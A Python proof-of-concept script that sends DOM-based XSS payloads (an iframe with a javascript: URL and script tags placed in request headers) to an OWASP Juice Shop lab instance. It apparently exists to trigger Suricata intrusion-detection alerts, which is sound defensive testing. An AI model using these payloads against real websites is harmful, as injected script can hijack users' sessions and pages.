#!/usr/bin/env python3
"""XSS - DOM-based XSS via search parameter in Juice Shop."""

import requests
import sys
import urllib.parse

TARGET = "http://juice-shop:3000"

def main():
    print("[*] XSS - DOM-based XSS PoC")
    print(f"[*] Target: {TARGET}")
    print()

    # DOM XSS via search - the search query is reflected into the DOM
    xss_payload = '<iframe src="javascript:alert(`xss`)">'
    encoded = urllib.parse.quote(xss_payload)

    url = f"{TARGET}/#/search?q={encoded}"
    raw_url = f"{TARGET}/rest/products/search?q={encoded}"

    print(f"[*] XSS Payload: {xss_payload}")
    print(f"[*] Full URL (browser): {url}")
    print(f"[*] Sending GET to search API to trigger network-level detection...")
    print()

    try:
        resp = requests.get(raw_url, timeout=10)
        print(f"[*] Status Code: {resp.status_code}")
        print(f"[*] Response length: {len(resp.text)} bytes")
        print()

        # Also send with XSS in various headers to ensure Suricata sees it
        headers = {
            "User-Agent": f"Mozilla/5.0 <script>alert('xss')</script>",
            "Referer": f"{TARGET}/search?q={xss_payload}",
        }
        resp2 = requests.get(f"{TARGET}/rest/products/search?q={encoded}", headers=headers, timeout=10)
        print(f"[*] Second request with XSS in headers - Status: {resp2.status_code}")

        print()
        print("[+] DOM XSS payload delivered via search parameter")
        print("[*] In a browser, navigating to the URL would execute the script in DOM context")
        print("[*] Suricata should detect the <script> / iframe tags in traffic")

    except requests.ConnectionError:
        print("[-] ERROR: Could not connect to Juice Shop")
        sys.exit(1)
    except Exception as e:
        print(f"[-] ERROR: {e}")
        sys.exit(1)

    print()
    print("[*] Attack complete. Check Suricata alerts for SID 100003, 100004.")

if __name__ == "__main__":
    main()
